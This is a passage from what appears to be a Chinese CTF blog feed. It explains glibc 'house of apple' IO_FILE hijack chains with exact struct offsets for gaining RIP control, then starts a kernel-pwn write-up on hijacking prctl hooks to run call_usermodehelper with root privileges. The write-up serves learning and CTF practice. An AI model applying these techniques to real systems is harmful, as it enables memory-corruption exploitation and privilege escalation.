class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base != NULL</code>不进入调用。</p><p>构造方法：</p><ol><li><code>_flags</code>设置为<code>~4</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li><li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为非<code>0</code>，即满足<code>*(A + 0x30) != 0</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li></ol><h4 id="IO-wdo-write"><a href="#IO-wdo-write" class="headerlink" title="_IO_wdo_write"></a><strong>_IO_wdo_write</strong></h4><p>调用链：<code>_IO_new_file_sync</code>=&gt;<code>_IO_do_flush</code>=&gt;<code>_IO_wdo_write</code>=&gt;<code>__libio_codecvt_out</code>=&gt;<code>DL_CALL_FCT</code>=&gt;<code>gs =</code> <code>fp-&gt;_codecvt-&gt;__cd_out.step</code>=&gt;<code>*(gs-&gt;__fct)(gs)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">    _IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">ssize_t</span> delta;</span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">        <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>满足<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0                                  \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \</span></span><br><span class="line"><span class="meta">          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)              \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \</span></span><br><span class="line"><span class="meta">           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr                  \</span></span><br><span class="line"><span class="meta">            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><p>使<code>fp-&gt;_mode &gt; 0</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">    _IO_wdo_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">wchar_t</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr</span><br><span class="line">            &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (_IO_new_do_write (fp, fp-&gt;_IO_write_base,</span><br><span class="line">                                  fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) == EOF)</span><br><span class="line">                <span class="keyword">return</span> WEOF;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Now convert from the internal format into the external buffer.  */</span></span><br><span class="line">            result = __libio_codecvt_out (cc, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                                          data, data + to_do, &amp;new_data,</span><br><span class="line">                                          write_ptr,</span><br><span class="line">                                          buf_end,</span><br><span class="line">                                          &amp;write_ptr);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>，然后这个判断需要为假<code>fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base</code>。</p><p>构造方式：</p><ol><li><code>vtable</code>设置为<code>_IO_file_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_new_file_sync</code>即可</li><li><code>_IO_write_ptr &gt; _IO_write_base</code>，即满足<code>*(fp + 0x28) &gt; *(fp + 0x20)</code></li><li><code>_mode &gt; 0</code>，即满足<code>(fp + 0xc0) &gt; 0</code></li><li><code>_IO_write_end != _IO_write_ptr</code>或者<code>_IO_write_end == _IO_write_base</code>，即满足<code>*(fp + 0x30) != *(fp + 0x28)</code>或者<code>*(fp + 0x30) == *(fp + 0x20)</code></li><li><code>_wide_data</code>设置为堆地址，假设地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt;= *(A + 0x18)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_out.step</code>设置为可控堆地址<code>C</code>，即满足<code>*(B + 0x38) = C</code></li><li><code>codecvt-&gt;__cd_out.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_out.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li></ol><h4 id="IO-wfile-sync"><a href="#IO-wfile-sync" class="headerlink" title="_IO_wfile_sync"></a><strong>_IO_wfile_sync</strong></h4><p>调用链：<code>_IO_wfile_sync</code>=&gt;<code>__libio_codecvt_length</code>=&gt;<code>DL_CALL_FCT</code>=&gt;<code>gs =</code> <code>fp-&gt;_codecvt-&gt;__cd_in.step</code>=&gt;<code>*(gs-&gt;__fct)(gs)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wint_t</span></span><br><span class="line">    _IO_wfile_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">ssize_t</span> delta;</span><br><span class="line">    <span class="keyword">wint_t</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">        <span class="keyword">if</span> (_IO_do_flush (fp))</span><br><span class="line">            <span class="keyword">return</span> WEOF;</span><br><span class="line">    delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">    <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* We have to find out how many bytes we have to go back in the</span></span><br><span class="line"><span class="comment">     external buffer.  */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cv</span> =</span> fp-&gt;_codecvt;</span><br><span class="line">        <span class="keyword">off64_t</span> new_pos;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> clen = __libio_codecvt_encoding (cv);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clen &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">/* It is easy, a fixed number of input bytes are used for each</span></span><br><span class="line"><span class="comment">       wide character.  */</span></span><br><span class="line">            delta *= clen;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* We have to find out the hard way how much to back off.</span></span><br><span class="line"><span class="comment">         To do this we determine how much input we needed to</span></span><br><span class="line"><span class="comment">         generate the wide characters up to the current reading</span></span><br><span class="line"><span class="comment">         position.  */</span></span><br><span class="line">            <span class="keyword">int</span> nread;</span><br><span class="line">            <span class="keyword">size_t</span> wnread = (fp-&gt;_wide_data-&gt;_IO_read_ptr</span><br><span class="line">                             - fp-&gt;_wide_data-&gt;_IO_read_base);</span><br><span class="line">            fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;</span><br><span class="line">            nread = __libio_codecvt_length (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                                            fp-&gt;_IO_read_base,</span><br><span class="line">                                            fp-&gt;_IO_read_end, wnread);</span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base</code>和<code>fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0</code>。可以看到这里还需要绕过<code>__libio_codecvt_encoding</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__libio_codecvt_encoding (struct _IO_codecvt *codecvt)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* See whether the encoding is stateful.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__stateful)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">/* Fortunately not.  Now determine the input bytes for the conversion</span></span><br><span class="line"><span class="comment">     necessary for each wide character.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__min_needed_from</span><br><span class="line">      != codecvt-&gt;__cd_in.step-&gt;__max_needed_from)</span><br><span class="line">    <span class="comment">/* Not a constant value.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> codecvt-&gt;__cd_in.step-&gt;__min_needed_from;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置<code>fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0</code>即可返回<code>-1</code>。</p><p>构造方式：</p><ol><li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_sync</code>即可</li><li><code>_wide_data</code>设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &lt;= *(A + 0x18)</code></li><li><code>_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end</code>，即满足<code>*A != *(A + 8)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__stateful</code>设置为非<code>0</code>，即满足<code>*(B + 0x58) != 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>rsi</code>为<code>&amp;codecvt-&gt;__cd_in.step_data</code>可控。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>house of apple1主要作用就是实现任意地址写，而我认为house of apple2是最吊的，一定程度上减少了覆盖这个SB pointer_guard。而house of apple3在构造方面要求相对来说较为苛刻。(我还跟个SB一样准备自己写pack_file函数来构造IO_FILE结构体，但是我发现pwntools居然有<code>FileStructure()</code>这个函数可以直接生成)</p><hr><p>参考链接：</p><p><a class="link"   href="https://bbs.pediy.com/thread-273832.htm#msg_header_h3_2" >https://bbs.pediy.com/thread-273832.htm#msg_header_h3_2<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://bbs.pediy.com/thread-273863.htm#msg_header_h3_3" >https://bbs.pediy.com/thread-273863.htm#msg_header_h3_3<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;死都想不到house of apple居然有三篇文章，这里就把第二篇和第三篇合并起来一起学完吧。&lt;/p&gt;
&lt;h2 id=&quot;house-of-apple2&quot;&gt;&lt;a href=&quot;#house-of-apple2&quot; class=&quot;headerlink&quot; title=&quot;house </summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of 系列" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn内存任意读写提升权限[2]</title>
    <link href="https://cv196082.gitee.io/2022/08/04/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90-2/"/>
    <id>https://cv196082.gitee.io/2022/08/04/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90-2/</id>
    <published>2022-08-04T07:50:55.000Z</published>
    <updated>2022-08-10T07:33:58.741Z</updated>
    
    <content type="html"><![CDATA[<p>这次的例题是solid_core，题目的整体和前面那一道stringipc几乎一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x77617369</span>:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;v27, a3, <span class="number">24LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    v5 = v3 + <span class="number">1</span>;</span><br><span class="line">    mutex_lock(v3 + <span class="number">1</span>);</span><br><span class="line">    v16 = *v3;</span><br><span class="line">    v7 = v29;</span><br><span class="line">    <span class="keyword">if</span> ( !*v3 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">    v17 = *((_QWORD *)v16 + <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(v17 + v29) &gt; *((_QWORD *)v16 + <span class="number">2</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    v18 = *((_QWORD *)v16 + <span class="number">1</span>) + v17;</span><br><span class="line">    <span class="keyword">if</span> ( v18 &lt;= <span class="number">0xFFFFFFFF7FFFFFFF</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">        printk(&amp;unk_779, v28);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( strncpy_from_user(v18, v28, v29) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br></pre></td></tr></table></figure><p>但是在写内容的这个地方和那一道题有些许不同，这里禁止往0xFFFFFFFF80000000之前的地址写入了，这也就导致昨天的两种利用方式无法使用了。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>Prctl是linux的一个函数，可以对进程、线程做一些设置，prctl内部通过虚表来调用对应的功能，如果我们劫持prctl的虚表，使它指向其他对我们有帮助的内核函数，比如call_usermodehelper函数，该函数执行一个用户传入的二进制文件，且以root权限执行，由此可以利用起来提权。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="keyword">int</span>, option, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg3,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">me</span> =</span> current;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line">    <span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">    error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">    <span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>prctl源码中调用了security_task_prctl函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> thisrc;</span><br><span class="line">    <span class="keyword">int</span> rc = -ENOSYS;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> *<span class="title">hp</span>;</span></span><br><span class="line"></span><br><span class="line">    list_for_each_entry(hp, &amp;security_hook_heads.task_prctl, <span class="built_in">list</span>) &#123;</span><br><span class="line">        thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">        <span class="keyword">if</span> (thisrc != -ENOSYS) &#123;</span><br><span class="line">            rc = thisrc;</span><br><span class="line">            <span class="keyword">if</span> (thisrc != <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数调用了task_prctl表里的函数，因此，如果我们劫持task_prctl表，就能通过执行prctl来执行我们想要的函数，比如call_usermodehelper函数。</p><p>提一下call_usermodehelper函数，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。起初的利用思路是劫持prctl的hook到这个函数，但存在一个问题，hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);这里的option是int类型的，会存在一个截断，而四字节的地址一般是用户态地址，由于题目有smap显然是不行的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call_usermodehelper</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">gfp_t</span> gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;</span><br><span class="line"></span><br><span class="line">info = call_usermodehelper_setup(path, argv, envp, gfp_mask,</span><br><span class="line"> <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (info == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> call_usermodehelper_exec(info, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看引用发现mce_do_trigger函数有调用call_usermodehelper并且第一个参数为全局变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mce_do_trigger</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">call_usermodehelper(mce_helper, mce_helper_argv, <span class="literal">NULL</span>, UMH_NO_WAIT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是需要改的东西比较多，所以寻找更好的gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">run_cmd</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> **argv;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line"><span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line"><span class="string">&quot;PATH=/sbin:/bin:/usr/sbin:/usr/bin&quot;</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">argv = argv_split(GFP_KERNEL, cmd, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (argv) &#123;</span><br><span class="line">ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">argv_free(argv);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __orderly_reboot(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = run_cmd(reboot_cmd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">pr_warn(<span class="string">&quot;Failed to start orderly reboot: forcing the issue\n&quot;</span>);</span><br><span class="line">emergency_sync();</span><br><span class="line">kernel_restart(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __orderly_poweroff(<span class="keyword">bool</span> force)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = run_cmd(poweroff_cmd);</span><br><span class="line"></span><br><span 